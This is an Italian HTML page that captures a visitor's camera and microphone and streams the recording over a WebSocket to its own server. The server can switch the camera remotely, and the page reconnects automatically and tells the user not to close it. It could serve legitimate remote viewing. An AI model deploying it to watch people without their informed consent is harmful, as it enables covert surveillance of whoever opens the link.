<!DOCTYPE html>
<html lang="it">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Client Video+Audio</title>
<style>
body { margin:0; padding:0; background:#000; color:#0f0; font-family:Arial; text-align:center; }
.msg { padding:40px 20px; font-size:18px; }
</style>
</head>
<body>
<div class="msg">Avvio telecamera...<br><small>Non chiudere la pagina</small></div>

<script>
const room = new URLSearchParams(location.search).get('room') || 'user1';
let ws, mediaRecorder, stream, currentCamera='environment', reconnectTimeout;

function connectWS(){
  ws = new WebSocket(`wss://${location.host}/bg-stream?room=${room}`);
  ws.onopen = ()=> startCamera(currentCamera);
  ws.onclose = ()=>{
    console.log('WS chiuso, riconnessione in 2s...');
    reconnectTimeout = setTimeout(connectWS, 2000);
  };
  ws.onerror = e=> console.log('Errore WS', e);
  ws.onmessage = e=>{
    try{
      const msg=JSON.parse(e.data);
      if(msg.type==='switchCamera'){
        currentCamera = msg.camera;
        startCamera(currentCamera);
      }
    }catch{}
  };
}
connectWS();

async function startCamera(camera){
  if(stream) stream.getTracks().forEach(t=>t.stop());
  try{
    stream = await navigator.mediaDevices.getUserMedia({ video:{facingMode:camera}, audio:true });
    mediaRecorder = new MediaRecorder(stream,{mimeType:'video/webm;codecs=vp8,opus'});
    mediaRecorder.ondataavailable = e=>{
      if(ws.readyState===WebSocket.OPEN && e.data.size>0) ws.send(e.data);
    };
    mediaRecorder.start(100); // chunk ogni 100ms
    document.body.innerHTML=`<div class="msg"><b>Streaming attivo</b></div>`;
  }catch(err){
    document.body.innerHTML=`<div class="msg">Errore: ${err.message}</div>`;
  }
}

// Ping ogni 10s
setInterval(()=>{ if(ws.readyState===WebSocket.OPEN) ws.send('ping'); },10000);
</script>
</body>
</html>
